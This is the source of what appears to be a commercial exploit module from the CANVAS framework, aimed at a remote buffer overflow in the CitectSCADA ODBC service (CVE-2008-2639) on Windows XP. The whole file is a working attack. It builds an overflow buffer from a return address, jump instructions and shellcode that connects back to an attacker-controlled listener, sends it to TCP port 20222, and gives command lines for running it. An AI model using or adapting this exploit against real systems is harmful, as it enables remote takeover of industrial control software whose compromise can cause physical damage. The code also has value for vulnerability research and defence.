#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2008
#http://www.immunityinc.com/CANVAS/ for more information

import sys
if '.' not in sys.path: sys.path.append('.')

import os
import getopt
import socket
import struct
import canvasengine

# CANVAS modules
from exploitutils import *
from tcpexploit import *
from encoder import chunkize
from MOSDEF import mosdef


# GUI info
NAME='CitectSCADA ODBC Buffer Overflow'
DESCRIPTION='CitectSCADA ODBC Buffer Overflow'
DOCUMENTATION={}
DOCUMENTATION['VENDOR']="Citect"
DOCUMENTATION['Date public']='06/11/08'
DOCUMENTATION['References']='http://www.coresecurity.com/content/citect-scada-odbc-service-vulnerability'
DOCUMENTATION['Repeatability']=''
DOCUMENTATION['CVE Name']='CVE-2008-2639'
DOCUMENTATION['CVE Url']='http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-2639'
DOCUMENTATION['CVSS'] = 7.6

VERSION='1.0'

PROPERTY={}
PROPERTY['TYPE']='Exploit'
PROPERTY['SITE']='Remote'
PROPERTY['ARCH']=[['Windows']]
PROPERTY['VERSION']=['XP','All']

NAME=DESCRIPTION

NOTES="""
Tested against CitectSCADA 6.0-r0 Trial on Windows XP SP1

Usage:
./exploits/citect_scada/citect_scada.py -v 1 -t 10.10.13.20 -l 10.10.13.1 -d 5555
./commandlineInterface.py -v 1 -p 5555
"""

CHANGELOG="""
"""

targets = {
    # pop pop ret , paload space.
    0:['Autodetect (N/A)',0],
    1:["CitectSCADA XP SP1 6.0-r0", 0x00385853, 221]
}

class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)
        self.setInfo(DESCRIPTION)
        self.name=NAME
        self.host=''
        self.port=20222
        self.badstring='\0'
        self.searchbadstring='\0'

    def neededListenerTypes(self):
        return [canvasengine.WIN32MOSDEF]

    def connect_to_host(self):
        s=self.gettcpsock()
        try:
            s.connect((self.host, self.port))
        except:
            return 0
        return s
    
    def createShellcode(self):
	self.createWin32SearchShellcode(self.callback.ip,self.callback.port)
	return

    def getArgs(self):
        self.host=self.target.interface
        self.port=int(self.argsDict.get('port',self.port))
        return

    def test(self):
        self.getArgs()
        s=self.gettcpsock()
        try:
            s.connect((self.host,self.port))
        except:
            self.log('Could not connect to port %s'%(self.port))
            return 0
        s.close()
        return 1

    def exploit_it(self):
	""" 
	Create our exploit buffer
	new exploit logic uses stroverwrite()
	"""
	desc, geteip, eipoffset = targets[self.version]
	self.log("Creating attack buffer for : %s"%desc)
			
	#self.log("Encoded Search Code: %s"%prettyhexprint(self.encodedsearchcode))
	self.log("Shellcode : %s"%prettyhexprint(self.shellcode))
	evl="A"*1050
	shelloffset=10
	evl=stroverwrite(evl, self.encodedsearchcode, shelloffset) # place our search code into our buffer
	evl=stroverwrite(evl, intel_order(geteip), eipoffset)  # place pop pop ret into buffer
	evl=stroverwrite(evl, binstring("eb 06"), eipoffset-4) # short jump over our eip
	jmpoffset=eipoffset+5-shelloffset+4 # 5 is for size of jump instruction, +4 is because we are at eipoffset+4, not eipoffset.
	self.log("Jump offset: %d"%jmpoffset)
	evl=stroverwrite(evl, mosdef.assemble("jmp $-%d"%(jmpoffset),"X86"), eipoffset+4) # far jmp to start of payload
	evl=stroverwrite(evl, self.shellcode, eipoffset + 20) # real shellcode to execute.
	
	#2 is our opcode 
        packet = intel_order ( 2 ) +  big_order(len(evl)) + evl
	
	self.log("SIZE : %s"%len(packet))
	return packet

    def run(self):
        self.getArgs()
        self.setInfo('%s attacking %s:%d - (in progress)'%(NAME,self.host,self.port))
        self.log('%s attacking %s:%d - (in progress)'%(NAME,self.host,self.port))
        self.test()

        if self.version==0:
            self.log('Autoversioning not available')
            return 0

        s = self.connect_to_host()
        if s == 0:
            self.log("Could not connect to %s:%d"% (self.host, self.port))
            return 0
	
	packet = self.exploit_it()
	length = big_order(len(packet))
        s.sendall(length)
        time.sleep(0.1)
	s.sendall(packet)
	#time.sleep(2)
	s.close()

        if self.ISucceeded():
            return 1

        s.close()
        return 0

    def displayVersions(self):
        i=0
        print 'Available versions:'
        for listline in targets.values():
            print '\t%d: %s'%(i,listline[0])
            i+=1

    def usage(self):
        print 'Usage: %s -v version -t host -p port -l localip -d localport\n'%(sys.argv[0])
        self.displayVersions()

if __name__=='__main__':
    app = theexploit()
    ret=standard_callback_commandline(app)
    if ret not in [0,1,None]:
        ret.interact()
